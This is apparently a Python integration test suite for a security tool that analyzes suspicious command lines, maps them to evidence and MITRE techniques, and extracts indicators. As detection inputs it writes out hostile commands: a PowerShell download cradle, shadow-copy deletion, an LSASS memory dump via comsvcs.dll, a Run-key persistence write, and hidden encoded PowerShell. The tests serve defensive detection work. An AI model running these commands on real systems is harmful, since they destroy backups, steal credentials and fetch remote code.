"""Integration tests for the command-line module's wiring into the app.

Covers the seams the unit tests cannot see: the evidence mapping in
``ioc.flags``, row-schema compatibility with the process module, session-state
round-tripping through ``dataclasses.asdict``, and the indicator handoff into
``ioc.parser``.
"""
from __future__ import annotations

import dataclasses
import unittest

from core import cmdline_analyzer as ca
from core import process_analyzer as pa
from ioc.flags import flags_summary_for_evidence
from ioc.parser import parse_iocs
from tests.test_cmdline_deobfuscator import ENCODED_CRADLE


class TestEvidenceMapping(unittest.TestCase):
    def test_download_cradle_maps_to_malware_executed(self) -> None:
        result = ca.analyze_command_line(ca.CommandLineInput(
            command_line="powershell -c (New-Object Net.WebClient).DownloadString('http://x/a')"
        ))
        summary = flags_summary_for_evidence(result.flags)
        self.assertTrue(summary["evidence"]["malware_executed"])

    def test_shadow_copy_deletion_maps_to_disruption(self) -> None:
        result = ca.analyze_command_line(ca.CommandLineInput(
            command_line="vssadmin.exe delete shadows /all /quiet"
        ))
        summary = flags_summary_for_evidence(result.flags)
        self.assertTrue(summary["evidence"]["service_disruption_or_encryption"])

    def test_run_key_write_maps_to_persistence(self) -> None:
        result = ca.analyze_command_line(ca.CommandLineInput(
            command_line=r"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v x /d y"
        ))
        summary = flags_summary_for_evidence(result.flags)
        self.assertTrue(summary["evidence"]["persistence_mechanism"])

    def test_lsass_access_maps_to_privilege_escalation(self) -> None:
        result = ca.analyze_command_line(ca.CommandLineInput(
            command_line="rundll32.exe C:\\windows\\system32\\comsvcs.dll, MiniDump 624 out.dmp"
        ))
        summary = flags_summary_for_evidence(result.flags)
        self.assertTrue(summary["evidence"]["privilege_escalation"])

    def test_encoding_alone_claims_no_evidence_key(self) -> None:
        # Obfuscation is a defense-evasion signal with no evidence key of its
        # own. Forcing it into one would overstate what encoding proves.
        import base64
        blob = base64.b64encode("whoami /all".encode("utf-16-le")).decode()
        line = f"powershell -enc {blob}"
        result = ca.analyze_command_line(ca.CommandLineInput(command_line=line))
        summary = flags_summary_for_evidence(result.flags)
        self.assertFalse(any(summary["evidence"].values()))

    def test_entropy_alone_claims_no_evidence_key(self) -> None:
        result = ca.analyze_command_line(ca.CommandLineInput(
            command_line="mytool.exe --blob pU3KGCUwux1tEyze1iN7LtkeP3IfyxlxF0SU1kk8nVw0"
        ))
        summary = flags_summary_for_evidence(result.flags)
        self.assertFalse(any(summary["evidence"].values()))

    def test_mitre_tactics_reach_the_summary(self) -> None:
        result = ca.analyze_command_line(ca.CommandLineInput(
            command_line="powershell -nop -w hidden -c iex"
        ))
        summary = flags_summary_for_evidence(result.flags)
        self.assertIn("T1059.001", summary["mitre_tactics"])

    def test_no_cmdline_flag_id_collides_with_a_reserved_substring(self) -> None:
        # The mapping above is keyed on exact ids, but the generic substring
        # rules run first — an id containing one of their tokens would inherit
        # a mapping nobody chose.
        reserved = (
            "MALWARE", "YARA", "SIGMA", "C2", "NETWORK_COMMS", "PHISHING", "BRAND_IMP",
            "CREDENTIAL_HARVEST", "EXPLOIT", "SQLI", "WEBATTACK", "CVE", "PORTSCAN",
            "RECON", "SCANNING", "WIDE_ATTACK", "PERSISTENCE", "REGISTRY_MOD", "MUTEX",
            "LATERAL", "SMB", "RDP", "PRIVESC", "PROCESS_INJECTION", "RANSOMWARE",
            "MASQUERADING", "SUSPICIOUS_PARENT_CHILD_PAIR", "PARENT_CHAIN_CONTAMINATION",
        )
        ids = [f"CMDLINE_{r['id']}" for r in ca.load_suspicious_keywords()] + [
            ca.CMDLINE_ENCODED_PAYLOAD, ca.CMDLINE_DECODED_SUSPICIOUS,
            ca.CMDLINE_SWITCH_COMBINATION, ca.CMDLINE_HIGH_ENTROPY_TOKEN,
        ]
        for flag_id in ids:
            for token in reserved:
                self.assertNotIn(token, flag_id, f"{flag_id} would inherit {token}'s mapping")


class TestRowCompatibility(unittest.TestCase):
    def test_schemas_match_key_for_key(self) -> None:
        cmd_rows = ca.to_rows(ca.analyze_command_line(
            ca.CommandLineInput(command_line="powershell -nop -c iex")
        ))
        proc_rows = pa.to_rows(pa.analyze_process_event(
            pa.ProcessFilepathInput(file_path=r"C:\Users\Public\a.exe")
        ))
        self.assertEqual(set(cmd_rows[0]), set(proc_rows[0]))

    def test_synthetic_rows_survive_arrow_beside_a_real_ioc_row(self) -> None:
        # Regression: a real IOC row carries a numeric ConfidenceScore. When a
        # synthetic row put "" in that column, pandas produced an object column
        # that pyarrow refused ("tried to convert to double"), and st.dataframe
        # failed for the whole run. Reaching this state is now the *normal*
        # outcome of the headline case — a decoded cradle yields a real URL row
        # next to the command row — so it is asserted rather than assumed.
        pd = __import__("pandas")
        try:
            pyarrow = __import__("pyarrow")
        except ImportError:  # pragma: no cover — pyarrow ships with streamlit
            self.skipTest("pyarrow not installed")

        real_row = {
            "Artifact": "8.8.8.8", "Type": "ip", "Verdict": "Clean",
            "Confidence": "High", "Primary Evidence": "x", "Next Action": "Review",
            "Sources": "VT", "ConfidenceScore": 12.5, "ConfidenceLabel": "Low",
            "ProviderScores": {}, "ActiveProviders": [], "InfraNote": "",
            "VerdictFromScore": "Clean",
        }
        synthetic = ca.to_rows(ca.analyze_command_line(
            ca.CommandLineInput(command_line="powershell -nop -c iex")
        )) + pa.to_rows(pa.analyze_process_event(
            pa.ProcessFilepathInput(file_path=r"C:\Users\Public\a.exe")
        ))

        table = pyarrow.Table.from_pandas(pd.DataFrame([real_row] + synthetic))
        self.assertEqual(str(table.schema.field("ConfidenceScore").type), "double")

    def test_concatenated_rows_are_not_ragged(self) -> None:
        cmd_rows = ca.to_rows(ca.analyze_command_line(
            ca.CommandLineInput(command_line="powershell -nop -c iex")
        ))
        proc_rows = pa.to_rows(pa.analyze_process_event(
            pa.ProcessFilepathInput(file_path=r"C:\Users\Public\a.exe")
        ))
        keys = {frozenset(row) for row in cmd_rows + proc_rows}
        self.assertEqual(len(keys), 1)


class TestSessionStateRoundTrip(unittest.TestCase):
    def test_result_is_asdict_serialisable(self) -> None:
        result = ca.analyze_command_line(ca.CommandLineInput(
            command_line=f"powershell -w hidden -enc {ENCODED_CRADLE}",
            context="alert text",
        ))
        payload = dataclasses.asdict(result)
        self.assertIn("commands", payload)
        self.assertIsInstance(payload["commands"][0], dict)
        self.assertIn("base_command", payload["commands"][0])

    def test_linked_process_is_not_serialised_into_the_result(self) -> None:
        # linked_process lives on the input, not the result. If it leaked onto
        # the result, asdict would duplicate the whole process analysis into
        # session state on every run.
        result = ca.analyze_command_line(ca.CommandLineInput(
            command_line="whoami",
            linked_process=pa.analyze_process_event(
                pa.ProcessFilepathInput(parent_process="winword.exe", child_process="cmd.exe")
            ),
        ))
        self.assertNotIn("linked_process", dataclasses.asdict(result))


class TestIocHandoff(unittest.TestCase):
    def test_decoded_url_parses_into_an_enrichable_ioc(self) -> None:
        result = ca.analyze_command_line(ca.CommandLineInput(
            command_line=f"powershell -enc {ENCODED_CRADLE}"
        ))
        parsed = parse_iocs("\n".join(result.ioc_candidates))
        self.assertTrue(parsed)
        urls = [i for i in parsed if i.type == "url"]
        self.assertEqual(urls[0].value, "http://198.51.100.7/a.ps1")

    def test_candidates_survive_the_parser_without_type_loss(self) -> None:
        candidates = ca.extract_ioc_candidates(
            "curl http://x.test/a.exe & ping 203.0.113.9 & "
            "certutil -hashfile x 44d88612fea8a8f36de82e1278abb02f"
        )
        types = {i.type for i in parse_iocs("\n".join(candidates))}
        self.assertEqual(types, {"url", "ip", "hash"})

    def test_no_candidates_from_a_benign_line(self) -> None:
        result = ca.analyze_command_line(ca.CommandLineInput(
            command_line=r'msiexec /i "C:\ProgramData\vendor\agent.msi" /qn'
        ))
        self.assertEqual(result.ioc_candidates, [])


class TestEndToEndShape(unittest.TestCase):
    def test_encoded_cradle_produces_a_complete_result(self) -> None:
        result = ca.analyze_command_line(ca.CommandLineInput(
            command_line=f"powershell.exe -NoP -NonI -W Hidden -Enc {ENCODED_CRADLE}"
        ))
        self.assertEqual(result.interpreter_detected, "powershell")
        self.assertTrue(result.was_obfuscated)
        self.assertTrue(result.commands)
        self.assertTrue(result.flags)
        self.assertTrue(result.ioc_candidates)
        self.assertTrue(result.rule_matches)
        # Malicious, not Suspicious: obfuscation plus a high-severity Sigma
        # match is the escalation rule, and Layer 5 supplies the second source that
        # MALICIOUS_REQUIRES_CORROBORATION demands.
        self.assertEqual(result.aggregated_verdict, "Malicious")
        self.assertTrue(ca.to_rows(result))

    def test_benign_line_produces_a_quiet_but_complete_result(self) -> None:
        result = ca.analyze_command_line(ca.CommandLineInput(
            command_line=r'"C:\Program Files\Vendor\agent.exe" --service --config a.cfg'
        ))
        self.assertTrue(result.parse_ok)
        self.assertFalse(result.was_obfuscated)
        self.assertEqual(result.flags, [])
        self.assertEqual(result.aggregated_verdict, "Unknown")
        self.assertTrue(ca.to_rows(result))


if __name__ == "__main__":
    unittest.main()
